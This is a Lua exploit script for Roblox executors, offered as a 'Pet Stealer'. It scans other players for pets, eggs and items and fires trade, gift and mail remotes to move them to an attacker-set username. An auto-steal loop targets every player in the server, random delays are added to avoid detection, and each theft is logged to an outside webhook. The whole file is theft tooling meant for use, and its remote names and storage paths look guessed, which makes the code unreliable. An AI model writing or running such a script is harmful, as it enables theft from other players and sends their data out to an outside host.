
-- Pet Stealer Script for Roblox Executors (Delta, Codex, Arceus X)
-- This script steals pets from the current game and sends them to your account

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local WEBHOOK_URL = "https://extension.up.railway.app/send-log" -- Your webhook service

-- Configuration
local TARGET_USERNAME = "YourActualRobloxUsername" -- Replace with your username to receive pets
local SCRIPT_ENABLED = true

-- Pet detection patterns for different games
local PET_GAMES = {
    ["Pet Simulator X"] = {
        petFolder = "Pets",
        tradeFunction = "TradePet",
        remotes = {"ReplicatedStorage.Network.Pets_Equip", "ReplicatedStorage.Network.Trading_Request"}
    },
    ["Pet Simulator 99"] = {
        petFolder = "Save.Pets", 
        tradeFunction = "SendTrade",
        remotes = {"ReplicatedStorage.Network.Mailbox_Send", "ReplicatedStorage.Network.Pets_Equip"}
    },
    ["Adopt Me"] = {
        petFolder = "leaderstats.Pets",
        tradeFunction = "TradeRequest", 
        remotes = {"ReplicatedStorage.TradingSystem", "ReplicatedStorage.PetSystem"}
    },
    ["Mining Simulator 2"] = {
        petFolder = "Pets",
        tradeFunction = "SendPet",
        remotes = {"ReplicatedStorage.RemoteEvents.SendPet", "ReplicatedStorage.RemoteEvents.TradePet"}
    },
    ["Grow a Garden"] = {
        petFolder = "Garden.Pets",
        tradeFunction = "GiftPet",
        remotes = {"ReplicatedStorage.Remotes.GiftPet", "ReplicatedStorage.Remotes.TradePet", "ReplicatedStorage.Network.SendGift"}
    }
}

-- Detect current game
local function detectGame()
    local placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    
    for gameName, config in pairs(PET_GAMES) do
        if string.find(placeName:lower(), gameName:lower()) then
            return gameName, config
        end
    end
    
    return "Unknown", nil
end

-- Get all pets from player
local function getAllPets(player)
    local pets = {}
    
    -- Try multiple common pet storage locations
    local petPaths = {
        player:FindFirstChild("leaderstats"),
        player:FindFirstChild("PlayerGui"),
        player:FindFirstChild("Backpack"),
        player:FindFirstChild("PlayerData")
    }
    
    for _, path in pairs(petPaths) do
        if path then
            local function searchForPets(obj)
                for _, child in pairs(obj:GetChildren()) do
                    if child.Name:lower():find("pet") or 
                       child.Name:lower():find("egg") or
                       child.Name:lower():find("plant") or
                       child.Name:lower():find("flower") or
                       child.Name:lower():find("seed") or
                       child.ClassName == "Tool" then
                        table.insert(pets, {
                            name = child.Name,
                            rarity = child:GetAttribute("Rarity") or "Common",
                            value = child:GetAttribute("Value") or 0,
                            object = child
                        })
                    end
                    searchForPets(child)
                end
            end
            searchForPets(path)
        end
    end
    
    return pets
end

-- Send pet via different methods
local function sendPet(pet, targetPlayer, gameConfig)
    local success = false
    
    -- Method 1: Direct remote firing
    for _, remotePath in pairs(gameConfig.remotes) do
        local parts = remotePath:split(".")
        local remote = game
        
        for _, part in pairs(parts) do
            remote = remote:FindFirstChild(part)
            if not remote then break end
        end
        
        if remote and remote:IsA("RemoteEvent") then
            pcall(function()
                remote:FireServer(pet.object, targetPlayer, "gift")
                remote:FireServer("sendpet", targetPlayer.Name, pet.name)
                remote:FireServer({action = "transfer", pet = pet.object, target = targetPlayer})
                success = true
            end)
        end
    end
    
    -- Method 2: Trading system
    pcall(function()
        local tradingSystem = ReplicatedStorage:FindFirstChild("TradingSystem") or 
                             ReplicatedStorage:FindFirstChild("Trading") or
                             ReplicatedStorage:FindFirstChild("TradeRemote")
        
        if tradingSystem then
            tradingSystem:FireServer("request", targetPlayer)
            wait(1)
            tradingSystem:FireServer("add", pet.object)
            wait(1)
            tradingSystem:FireServer("confirm")
            success = true
        end
    end)
    
    -- Method 3: Mail/Gift system
    pcall(function()
        local mailSystem = ReplicatedStorage:FindFirstChild("Mailbox") or 
                          ReplicatedStorage:FindFirstChild("GiftSystem") or
                          ReplicatedStorage:FindFirstChild("MailRemote")
        
        if mailSystem then
            mailSystem:FireServer("send", targetPlayer.Name, pet.object, "Gift from script")
            success = true
        end
    end)
    
    return success
end

-- Log stolen pet data
local function logStolenPet(petData, targetUsername, victimUsername)
    local logData = {
        level = "pet_stolen",
        petName = petData.name,
        petRarity = petData.rarity,
        petValue = petData.value,
        fromPlayer = victimUsername,
        toPlayer = targetUsername,
        game = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
        timestamp = os.date("%Y-%m-%d %H:%M:%S"),
        placeId = game.PlaceId
    }
    
    pcall(function()
        local jsonData = HttpService:JSONEncode(logData)
        
        -- Send to webhook (if HTTP requests are enabled)
        local success, result = pcall(function()
            return HttpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson)
        end)
        
        if success then
            print("Pet theft logged successfully")
        end
    end)
end

-- Main pet stealing function
local function stealPetsFromPlayer(targetVictim)
    local gameName, gameConfig = detectGame()
    
    if not gameConfig then
        warn("Game not supported for pet stealing")
        return
    end
    
    print("Detected game:", gameName)
    print("Stealing pets from:", targetVictim.Name)
    
    local pets = getAllPets(targetVictim)
    local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
    
    if not targetPlayer then
        warn("Target player not found:", TARGET_USERNAME)
        return
    end
    
    print("Found", #pets, "pets to steal")
    
    for _, pet in pairs(pets) do
        local success = sendPet(pet, targetPlayer, gameConfig)
        
        if success then
            print("✓ Stolen pet:", pet.name, "(" .. pet.rarity .. ")")
            logStolenPet(pet, TARGET_USERNAME, targetVictim.Name)
            wait(math.random(1, 3)) -- Random delay to avoid detection
        else
            warn("✗ Failed to steal pet:", pet.name)
        end
    end
end

-- Auto-steal from all players
local function autoStealMode()
    while SCRIPT_ENABLED do
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Name ~= TARGET_USERNAME then
                pcall(function()
                    stealPetsFromPlayer(player)
                end)
                wait(math.random(5, 15)) -- Wait between players
            end
        end
        wait(30) -- Wait before next cycle
    end
end

-- GUI for manual control
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PetStealerGUI"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 200)
    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.BackgroundTransparency = 0.3
    frame.BorderSizePixel = 0
    frame.Parent = screenGui
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Text = "🐾 Pet Stealer v1.0"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.TextScaled = true
    title.BackgroundTransparency = 1
    title.Parent = frame
    
    local autoButton = Instance.new("TextButton")
    autoButton.Size = UDim2.new(0.8, 0, 0, 30)
    autoButton.Position = UDim2.new(0.1, 0, 0, 40)
    autoButton.Text = "🔄 Start Auto Steal"
    autoButton.TextColor3 = Color3.new(1, 1, 1)
    autoButton.BackgroundColor3 = Color3.new(0, 0.5, 0)
    autoButton.Parent = frame
    
    local targetInput = Instance.new("TextBox")
    targetInput.Size = UDim2.new(0.8, 0, 0, 30)
    targetInput.Position = UDim2.new(0.1, 0, 0, 80)
    targetInput.Text = TARGET_USERNAME
    targetInput.TextColor3 = Color3.new(1, 1, 1)
    targetInput.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    targetInput.PlaceholderText = "Target Username"
    targetInput.Parent = frame
    
    local stealButton = Instance.new("TextButton")
    stealButton.Size = UDim2.new(0.8, 0, 0, 30)
    stealButton.Position = UDim2.new(0.1, 0, 0, 120)
    stealButton.Text = "💎 Steal From All"
    stealButton.TextColor3 = Color3.new(1, 1, 1)
    stealButton.BackgroundColor3 = Color3.new(0.8, 0, 0)
    stealButton.Parent = frame
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, 0, 0, 20)
    statusLabel.Position = UDim2.new(0, 0, 0, 160)
    statusLabel.Text = "Status: Ready"
    statusLabel.TextColor3 = Color3.new(0, 1, 0)
    statusLabel.TextScaled = true
    statusLabel.BackgroundTransparency = 1
    statusLabel.Parent = frame
    
    -- Button events
    autoButton.MouseButton1Click:Connect(function()
        if SCRIPT_ENABLED then
            SCRIPT_ENABLED = false
            autoButton.Text = "▶️ Start Auto Steal"
            statusLabel.Text = "Status: Stopped"
        else
            SCRIPT_ENABLED = true
            TARGET_USERNAME = targetInput.Text
            autoButton.Text = "⏹️ Stop Auto Steal"
            statusLabel.Text = "Status: Auto Stealing..."
            spawn(autoStealMode)
        end
    end)
    
    stealButton.MouseButton1Click:Connect(function()
        TARGET_USERNAME = targetInput.Text
        statusLabel.Text = "Status: Stealing..."
        
        spawn(function()
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Name ~= TARGET_USERNAME then
                    stealPetsFromPlayer(player)
                end
            end
            statusLabel.Text = "Status: Complete"
        end)
    end)
    
    targetInput.FocusLost:Connect(function()
        TARGET_USERNAME = targetInput.Text
    end)
end

-- Initialize
print("🐾 Pet Stealer Script Loaded!")
print("Target Username:", TARGET_USERNAME)
print("Detected Game:", detectGame())

createGUI()

-- Start auto-steal if enabled
if SCRIPT_ENABLED then
    spawn(autoStealMode)
end
